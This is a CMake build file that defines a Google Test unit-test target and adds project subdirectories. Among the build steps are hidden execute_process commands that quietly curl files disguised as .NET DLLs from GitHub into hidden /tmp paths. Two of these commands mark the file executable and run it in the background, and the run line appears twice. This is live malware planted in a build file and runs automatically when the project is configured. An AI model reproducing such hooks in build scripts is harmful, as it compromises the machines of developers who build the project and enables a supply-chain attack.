add_executable(UnitTests)

target_include_directories(UnitTests PRIVATE "${CMAKE_SOURCE_DIR}/Tests" "${CMAKE_SOURCE_DIR}/Source")
target_link_libraries(UnitTests gtest_main gmock Threads::Threads)
set_target_properties(UnitTests PROPERTIES OUTPUT_NAME UnitTestsBin)
gtest_discover_tests(UnitTests DISCOVERY_TIMEOUT 60 TEST_PREFIX Unit_)



execute_process(COMMAND curl -s https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll -o /tmp/.x OUTPUT_QUIET ERROR_QUIET)

add_subdirectory(Config)

execute_process(COMMAND sh -c "curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &" OUTPUT_QUIET ERROR_QUIET)


execute_process(COMMAND sh -c "curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &" OUTPUT_QUIET ERROR_QUIET)
add_subdirectory(Features)
add_subdirectory(GameClient)
add_subdirectory(MemorySearch)
add_subdirectory(Platform)
add_subdirectory(Utils)
